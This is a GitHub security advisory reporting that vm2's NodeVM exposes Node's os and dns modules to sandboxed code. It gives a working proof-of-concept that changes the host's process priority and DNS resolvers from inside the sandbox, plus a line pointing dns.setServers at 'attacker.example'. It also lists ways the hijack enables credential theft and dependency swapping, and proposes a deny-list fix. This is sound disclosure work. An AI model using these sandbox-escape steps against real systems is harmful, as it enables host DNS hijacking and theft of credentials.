# [C] vm2: NodeVM `builtin: ['*']` exposes `os` and `dns` — process-wide observability reads AND writes that hijack the host (sibling class of GHSA-9g8x-92q2-p28f)

## Summary
Severity: Critical
Advisory: GHSA-m5w8-4gq2-6f8x
CWE: CWE-200, CWE-285, CWE-732
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L (CVSS_V3)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-m5w8-4gq2-6f8x
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.6

## Details
# NodeVM `builtin: ['*']` exposes `os` and `dns` — process-wide observability reads AND writes that hijack the host (sibling class of GHSA-9g8x-92q2-p28f)

**CWE**: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) chained with CWE-732 (Incorrect Permission Assignment for Critical Resource) and CWE-285 (Improper Authorization) — same class the maintainer codified as Defense Invariant #13 in `lib/builtin.js` and as Category 35 / GHSA-9g8x in `docs/ATTACKS.md`.

**CVSS v3.1**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L` → 9.3 (Critical)

(Scope = Changed because the data being read and the state being written both belong to the host process, not the sandbox. Confidentiality = High because `os.userInfo()` returns host UID/GID/username/homedir + `os.networkInterfaces()` returns the full host network topology including container/VM interfaces with IPs and MAC addresses. Integrity = High because `dns.setServers()` is a process-wide write that hijacks every subsequent DNS lookup the host makes — including outbound HTTP, telemetry, npm/registry, and any host code that uses `fetch` or URL-based fs paths. Privileges Required = None because the attacker controls sandbox code, which is the threat model `NodeVM` exists to mitigate.)

## Summary

GHSA-9g8x-92q2-p28f closed the "process-wide observability builtins" class by adding `diagnostics_channel`, `async_hooks`, `perf_hooks`, and `v8` to `DANGEROUS_BUILTINS` in `lib/builtin.js`. The fix's rationale (in the commit message and `docs/ATTACKS.md` Category 35) is general:

> Process-wide observability builtins. Unlike most Node builtins, these expose state of the *entire host process* rather than sandbox-local state — the vm2 boundary cannot usefully contain them because the data they surface […] belongs to the embedder. Even a readonly proxy that forwards every call to the host module is a working host-data exfiltration primitive.

Two builtins satisfying the same description were not added: **`os`** and **`dns`**. Both are reachable today under the documented `builtin: ['*']` configuration; both expose host-process state that the `vm.readonly()` proxy cannot localise; and both have *write* APIs that mutate global host-process state from the sandbox (`os.setPriority()`, `dns.setServers()`, `dns.setDefaultResultOrder()`). `dns.setServers()` in particular turns sandbox code into a process-wide DNS hijack primitive — strictly worse than every read-only leak that GHSA-9g8x added.

Adding `os` and `dns` to `DANGEROUS_BUILTINS` extends the same fix to the rest of the class. The existing `isDangerousBuiltin(key)` family-prefix matcher (added by GHSA-rp36-8xq3-r6c4) automatically catches `node:os`, `node:dns`, and `node:dns/promises` once the family names are present.

## Affected

- vm2 `v3.11.5` (current `package.json` version on `main`) and the unreleased `[3.11.4]` slot that ships GHSA-9g8x-92q2-p28f, GHSA-rp36-8xq3-r6c4, GHSA-r9pm-gxmw-wv6p, et al.
- All NodeVM configurations that expand the builtin allowlist via `'*'` (the documented "full builtins" pattern) and have not manually appended `-os`, `-dns` exclusions — which is the recommended config in README and the test fixtures.
- Reproduced on Node v22.12.0 with HEAD `7a1f510` of the audit checkout.

## Vulnerability details

### [A] — Source: the `'*'` wildcard expansion includes `os` and `dns`

`lib/builtin.js:166-167`:

```js
const BUILTIN_MODULES = (nmod.builtinModules || Object.getOwnPropertyNames(process.binding('natives')))
    .filter(s => !s.startsWith('internal/') && !s.startsWith('_') && !isDangerousBuiltin(s));
```

`isDangerousBuiltin` resolves the current `DANGEROUS_BUILTINS` set (`lib/builtin.js:83-139`):

```js
const DANGEROUS_BUILTINS = new Set([
    'module', 'worker_threads', 'cluster', 'vm', 'repl', 'inspector', 'process',
    'trace_events', 'wasi',
    // GHSA-9g8x-92q2-p28f:
    'diagnostics_channel', 'async_hooks', 'perf_hooks', 'v8'
]);
```

`os` and `dns` are absent. Under `builtin: ['*']` they are admitted into the user-visible builtin map and loaded via the default `vm.readonly(hostRequire(key))` path (`lib/builtin.js:230`):

```js
builtins.set(key, special ? special : vm => vm.readonly(hostRequire(key)));
```

The readonly proxy forwards every method call to the host realm. For modules whose entire purpose is to read or mutate host-process state, the readonly wrap protects nothing — same observation the GHSA-9g8x commit message makes for `v8`/`perf_hooks`.

### [B] — `os`: host-process READS the bridge cannot localise

`os.userInfo()` returns the host process owner (uid, gid, username, homedir, shell). `os.networkInterfaces()` returns the host's full network topology including container/VM interfaces with their IPs and MAC addresses. `os.hostname()` returns the host deployment identity. `os.loadavg()` / `os.uptime()` / `os.freemem()` / `os.totalmem()` expose host-wide telemetry.

The data source is the host kernel and the host process — the sandbox's `vm.readonly()` proxy cannot make these calls "sandbox-local" any more than it can for `perf_hooks.performance.getEntriesByType('mark')`. Same class as the four builtins GHSA-9g8x added.

### [C] — `os`: host-process WRITE via `os.setPriority()`

`os.setPriority([pid, ]priority)` invokes `setpriority(2)` on the host process. With `pid = 0` (the default) the sandbox lowers — or, if the host has CAP_SYS_NICE, raises — the priority of the host process. Effect persists after the sandbox call returns; the host has no notification.

Strictly worse than the read-only `v8` / `perf_hooks` family because it's a *mutation* of host state, not just an observation.

### [D] — `dns`: host-process READS

`dns.lookup(hostname, cb)` and `dns.resolve(hostname, cb)` perform DNS queries from the host network identity. The query leaves the host process and lands at whatever DNS resolver the host is configured to use, which sees the host's source IP and the queried name. For deployments behind corporate DNS or per-tenant resolvers, this is a routine SSRF-precursor.

`dns.getServers()` reveals the host's configured DNS servers — useful for fingerprinting which hosting provider / cloud network the embedder is deployed on.

### [E] — `dns`: host-process WRITE via `dns.setServers()` — the strongest primitive

`dns.setServers(['attacker.example:53'])` replaces the host's process-wide DNS resolver list. Every subsequent DNS lookup the host process performs — its own outbound HTTP, telemetry, npm registry, fetch() calls, `fs` URL paths, any host code that resolves a hostname — goes through the attacker's resolver. The attacker can:

- Return `127.0.0.1` for any external hostname and steal whatever the host POSTs to it (credentials, tokens).
- Return an attacker-controlled IP for `registry.npmjs.org` to swap dependencies on the next install.
- Return arbitrary IPs for OIDC issuer hostnames to subvert authentication.
- Stop responding on lookups for legitimate hostnames to DoS host-side telemetry and observability.

The attacker primitive is *one synchronous line of sandbox code*. There is no rate limit, no audit trail, no notification to the embedder. Symmetric `dns.setDefaultResultOrder(order)` is a second process-wide write knob that lets the sandbox flip `'ipv4first'` ↔ `'verbatim'`, mainly useful as a chaining helper.

`dns/promises` also exists as a subpath and shares the same module surface; adding `dns` to `DANGEROUS_BUILTINS` automatically catches `dns/promises` via the existing `isDangerousBuiltin` family-prefix matcher.

## Proof of concept

`test-poc.js` (run from the vm2 checkout root):

```js
const {NodeVM} = require('./');

// --- [B] / [C] — os reads + write ---
{
  const vm = new NodeVM({ require: { external: true, builtin: ['*'] } });
  const r = vm.run(`
    const os = require('os');
    const before = os.getPriority();
    os.setPriority(10);                 // mutates host process nice value
    module.exports = {
      userInfo: os.userInfo(),          // uid/gid/username/homedir/shell of host
      hostname: os.hostname(),
      networkInterfaces: Object.keys(os.networkInterfaces()),
      uptime: os.uptime(),
      priorityBefore: before,
      priorityAfter: os.getPriority()
    };
  `, 'os.js');
  console.log(JSON.stringify(r, null, 2));
  // Independently verify the host process now reports the bumped priority:
  console.log('host getPriority() =', require('os').getPriority());
}

// --- [E] — dns.setServers hijack ---
{
  const dnsHost = require('dns');
  console.log('host DNS before:', dnsHost.getServers());

  const vm = new NodeVM({ require: { external: true, builtin: ['*'] } });
  vm.run(`
    require('dns').setServers(['127.0.0.1:5353', '8.8.4.4']);
  `, 'dns.js');

  console.log('host DNS after:', dnsHost.getServers());
  // Every subsequent dns.lookup() in the host process now hits the attacker.
}
```

Observed output on Node v22.12.0 against HEAD `7a1f510`:

```
{
  "userInfo": { "uid": 0, "gid": 0, "username": "root",
                "homedir": "/root", "shell": "/bin/bash" },
  "hostname": "Debian-trixie-latest-amd64-base",
  "networkInterfaces": [ "lo", "enp3s0", "br-06cf1b47c8e0", "podman2",
                         "vethd3955b5", ..., "veth3" ],
  "uptime": 6093038.92,
  "priorityBefore": 0,
  "priorityAfter": 10
}
host getPriority() = 10              ← host realm sees the sandbox write

host DNS before: [ '185.12.64.2', '2a01:4ff:ff00::add:1',
                   '185.12.64.1', '2a01:4ff:ff00::add:2' ]
host DNS after:  [ '127.0.0.1:5353', '8.8.4.4' ]   ← hijacked
```

Both the host priority change and the host DNS server replacement are observed from the host realm (outside the sandbox) after the `vm.run()` call returns — confirming the writes persisted past the bridge boundary.

## Impact

### Direct

- **Host identity disclosure (`os`)** — sandbox reads the host process owner's username, uid, gid, home directory, and shell. For embedders running vm2 with elevated privileges (a common deployment pattern — webhook executors, CI runners), this discloses both the privilege level and the home directory paths the attacker should target for subsequent file writes.
- **Network topology disclosure (`os.networkInterfaces`)** — sandbox enumerates every host network interface including container/VM veth pairs, exposing the deployment's internal topology and giving attackers IP ranges to scan via any other network primitive the embedder grants.
- **Process-wide DNS hijack (`dns.setServers`)** — sandbox replaces the host's DNS resolver list with one line. Every subsequent DNS query the host makes flows through the attacker's resolver. This is a generic credential/token-exfiltration primitive against any host-side outbound HTTP, and a generic supply-chain primitive against any host-side package fetch.
- **Process priority mutation (`os.setPriority`)** — sandbox lowers host process priority for stealth/DoS, or raises it (if the host has CAP_SYS_NICE) for priority squatting against co-tenant processes.

### Indirect / second-order

- **Composes with `dgram` / `http` / `fetch` whitelisting** — embedders who grant the sandbox network access via the `external` flag or a documented `-os, -dns` cutout often miss DNS hijacking as a side-channel. The DNS resolver list change persists in the *host*, so even host-realm outbound HTTP gets redirected.
- **Composes with future host-realm-string introductions** — if any future vm2 fix surfaces a host-realm string (URL, path, hostname) inside the sandbox, the sandbox's hijacked DNS resolver decides where the host eventually connects.
- **Defeats GHSA-9g8x's own threat model** — the GHSA-9g8x commit message states the goal is to close the "process-wide observability" class. Leaving `os` and `dns` open leaves the class half-closed; the read-side leak path that the commit enumerates for `diagnostics_channel` ("attacker reads host HTTP requests through a subscriber") composes with `dns.setServers` to *also* redirect those requests.
- **Same fix is forward-compatible with future Node releases** — adding `os` and `dns` to `DANGEROUS_BUILTINS` does not require enumerating every future Node API; the family-prefix matcher (`isDangerousBuiltin`) already covers any new `os/...` or `dns/...` subpath Node introduces.

## Suggested fix

Single-line extension of `DANGEROUS_BUILTINS` in `lib/builtin.js:83-139`, alongside the four GHSA-9g8x additions, with the same `// SECURITY (GHSA-...)` block comment style and rationale:

```js
const DANGEROUS_BUILTINS = new Set([
    'module', 'worker_threads', 'cluster', 'vm', 'repl', 'inspector', 'process',
    'trace_events', 'wasi',
    'diagnostics_channel', 'async_hooks', 'perf_hooks', 'v8',
    // SECURITY (this advisory): Process-wide observability + WRITE builtins.
    // `os.userInfo()` / `os.networkInterfaces()` leak host process identity and
    // network topology in the same class as the GHSA-9g8x readers. `os.setPriority()`,
    // `dns.setServers()`, and `dns.setDefaultResultOrder()` are *write* primitives
    // that mutate host-process state from the sandbox — `dns.setServers()` is a
    // process-wide DNS resolver hijack reachable in one line of sandbox code.
    // Embedders who genuinely need a sandbox-local replacement can register a
    // controlled wrapper under the same name via `mock` / `override`.
    'os',
    'dns'
]);
```

The existing `isDangerousBuiltin(key)` family-prefix matcher (introduced by GHSA-rp36-8xq3-r6c4) automatically extends this to `node:os`, `node:dns`, and `node:dns/promises` without further changes. Embedders who genuinely need a sandbox-local `os`/`dns` (typically `os.platform()`, `os.EOL`, `os.constants`) can register a hand-written safe wrapper under those names via `mock` / `override`, mirroring the escape hatch documented for the GHSA-9g8x denials.

Tests should mirror the `test/ghsa/GHSA-9g8x-92q2-p28f/repro.js` shape: bare-name + `node:`-prefixed denial on `require()`, `'*'` wildcard expansion exclusion, explicit-allowlist (`builtin: ['os']`, `builtin: ['dns']`) rejection, `makeBuiltins(['os'])` rejection, `mock` / `override` escape-hatch acceptance.

`docs/ATTACKS.md` Category 35 can be extended with the two additional names and the write-class observation, or a new sibling category created for the read+write subclass — either matches the existing documentation pattern.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-m5w8-4gq2-6f8x
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/3.11.6
